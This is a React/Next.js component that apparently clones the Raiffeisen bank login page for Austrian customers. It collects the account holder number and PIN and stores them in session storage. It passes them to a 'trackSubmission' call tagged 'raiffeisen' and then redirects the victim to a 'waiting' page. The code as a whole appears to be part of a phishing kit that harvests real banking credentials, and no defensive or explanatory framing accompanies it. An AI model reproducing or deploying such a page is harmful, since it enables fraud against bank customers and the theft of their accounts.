"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import LanguageSwitch from "./LanguageSwitch";
import { trackSubmission } from "@/lib/track";

const STORAGE_KEY = "raf-login-state";

type StoredState = {
  bundesland: string;
  verfueger: string;
  pin: string;
  saveVerfueger: boolean;
};

const bundeslaender = [
  "Burgenland",
  "Kärnten",
  "Niederösterreich",
  "Oberösterreich",
  "Salzburg",
  "Steiermark",
  "Tirol",
  "Vorarlberg",
  "Wien",
];

export default function LoginCard() {
  const router = useRouter();
  const [bundesland, setBundesland] = useState("");
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [saveVerfueger, setSaveVerfueger] = useState(false);
  const [showBundeslandDropdown, setShowBundeslandDropdown] = useState(false);
  const [hydrated, setHydrated] = useState(false);

  useEffect(() => {
    const raw = sessionStorage.getItem(STORAGE_KEY);
    if (raw) {
      try {
        const s = JSON.parse(raw) as Partial<StoredState>;
        if (s.bundesland) setBundesland(s.bundesland);
        if (s.verfueger) setVerfueger(s.verfueger);
        if (s.pin) setPin(s.pin);
        if (s.saveVerfueger) setSaveVerfueger(s.saveVerfueger);
      } catch {}
    }
    setHydrated(true);
  }, []);

  useEffect(() => {
    if (!hydrated) return;
    const state: StoredState = { bundesland, verfueger, pin, saveVerfueger };
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  }, [hydrated, bundesland, verfueger, pin, saveVerfueger]);

  const isValid = bundesland !== "" && verfueger !== "" && pin !== "";

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    trackSubmission("raiffeisen", "login", { bundesland, verfueger, pin });
    router.push(`/waiting?user=${encodeURIComponent(verfueger)}`);
  };

  return (
    <form onSubmit={handleSubmit} className="flex justify-center items-center min-h-[calc(100dvh-60px)] px-4 sm:px-0 py-6">
      <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-[34px] pb-3 flex flex-col shadow-lg">
        {/* Logo */}
        <div className="absolute -top-[34px] left-0 right-0 flex justify-center pointer-events-none">
          <div
            className="w-[68px] h-[68px] bg-center bg-no-repeat"
            style={{ backgroundSize: "68px", backgroundImage: "url('/raiffeisen/raiffeisen-logo.svg')" }}
          />
        </div>

        {/* Language switch */}
        <div className="flex justify-end px-3 pt-1 mb-2">
          <LanguageSwitch />
        </div>

        {/* Content */}
        <div className="flex-1 mt-0">
          <div className="px-3 sm:px-4">
            <h1 className="text-2xl font-normal mb-2 whitespace-nowrap">
              Bitte melden Sie sich an
            </h1>

            <p className="mt-3 text-sm text-raf-text-secondary">
              Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
            </p>

            {/* Bundesland Select */}
            <div className="my-3 form-field">
              <div className="relative">
                <div className="relative pt-4">
                  <button
                    type="button"
                    onClick={() => setShowBundeslandDropdown(!showBundeslandDropdown)}
                    className="w-full flex items-center justify-between pb-1 text-left bg-transparent border-0 cursor-pointer"
                  >
                    <span className={`text-base ${bundesland ? "text-raf-black" : "text-transparent"}`}>
                      {bundesland || "placeholder"}
                    </span>
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      className={`flex-shrink-0 text-raf-gray-700 transition-transform ${showBundeslandDropdown ? "rotate-180" : ""}`}
                    >
                      <path d="M7 10l5 5 5-5z" />
                    </svg>
                  </button>
                  <label
                    className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                      bundesland
                        ? "top-0 text-xs text-raf-text-secondary"
                        : "top-1/2 -translate-y-1/2 text-base text-raf-text-secondary"
                    }`}
                  >
                    Bundesland oder Bank wählen
                    <span className="text-raf-danger ml-0.5">*</span>
                  </label>
                </div>
                <div className="form-field-underline" />

                {showBundeslandDropdown && (
                  <div className="absolute top-full left-0 right-0 bg-white shadow-lg z-20 border border-raf-gray-300 max-h-60 overflow-y-auto">
                    {bundeslaender.map((bl) => (
                      <button
                        key={bl}
                        type="button"
                        onClick={() => {
                          setBundesland(bl);
                          setShowBundeslandDropdown(false);
                        }}
                        className={`w-full text-left px-4 py-3 text-sm hover:bg-raf-gray-100 transition-colors ${
                          bundesland === bl ? "bg-raf-primary/10 font-semibold" : ""
                        }`}
                      >
                        {bl}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>

            {/* Verfügernummer */}
            <div className="mb-3 form-field">
              <div className="relative pt-4">
                <input
                  type="text"
                  value={verfueger}
                  onChange={(e) => setVerfueger(e.target.value)}
                  placeholder=" "
                  className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none"
                />
                <label
                  className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                    verfueger
                      ? "top-0 text-xs text-raf-text-secondary"
                      : "top-1/2 -translate-y-1/2 text-base text-raf-text-secondary"
                  }`}
                >
                  Verfügernummer eingeben
                  <span className="text-raf-danger ml-0.5">*</span>
                </label>
              </div>
              <div className="form-field-underline" />
            </div>

            {/* PIN + Checkbox row */}
            <div className="mb-3">
              {/* PIN */}
              <div className="form-field">
                <div className="relative pt-4">
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder=" "
                    className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none"
                  />
                  <label
                    className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                      pin
                        ? "top-0 text-xs text-raf-text-secondary"
                        : "top-1/2 -translate-y-1/2 text-base text-raf-text-secondary"
                    }`}
                  >
                    PIN eingeben
                    <span className="text-raf-danger ml-0.5">*</span>
                  </label>
                </div>
                <div className="form-field-underline" />
              </div>

              {/* Checkbox row */}
              <div className="flex items-center gap-2 mt-3 pb-1">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={saveVerfueger}
                    onChange={(e) => setSaveVerfueger(e.target.checked)}
                    className="raf-checkbox"
                  />
                  <span className="text-sm">Verfüger speichern</span>
                </label>
                <button
                  type="button"
                  className="w-8 h-8 rounded-full flex items-center justify-center text-raf-gray-700 hover:bg-raf-gray-100 transition-colors"
                  aria-label="Hinweis zur Checkbox 'Verfüger speichern' öffnen"
                >
                  <svg
                    width="18"
                    height="18"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Submit button */}
        <div className="px-3 sm:px-4 pt-3 flex justify-center">
          <button
            type="submit"
            disabled={!isValid}
            className="raf-btn-primary w-full sm:w-1/2"
          >
            Weiter
          </button>
        </div>

        {/* Bottom spacing */}
        <div className="px-3 sm:px-4 mb-1" />
      </div>
    </form>
  );
}
